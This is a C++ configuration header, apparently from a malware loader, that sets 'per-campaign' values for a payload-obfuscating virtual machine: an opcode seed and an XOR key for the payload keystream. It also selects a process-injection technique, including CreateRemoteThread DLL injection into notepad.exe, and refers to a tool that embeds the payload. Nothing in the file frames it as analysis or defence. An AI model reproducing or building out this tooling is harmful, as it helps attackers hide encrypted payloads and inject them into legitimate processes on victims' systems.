#pragma once
#include <cstdint>

// Per-campaign knobs. Change both values, then rebuild loader + rerun tools/embed_payload.py.
#define VM_OPCODE_SEED 0xDEADBEEFu
#define VM_XOR_KEY     0xC0FFEE4Au  // 32-bit seed for the payload keystream
#define VM_STACK_SIZE  (1u << 20)  // 1 MiB

// Injection technique: 0=inline, 1=fiber, 2=remote_thread (DLL injection)
#ifndef VM_INJECT_TECHNIQUE
#define VM_INJECT_TECHNIQUE  0
#endif

// Target process name for technique 2 (CreateRemoteThread DLL injection)
#define VM_TARGET_PROCESS  "notepad.exe"
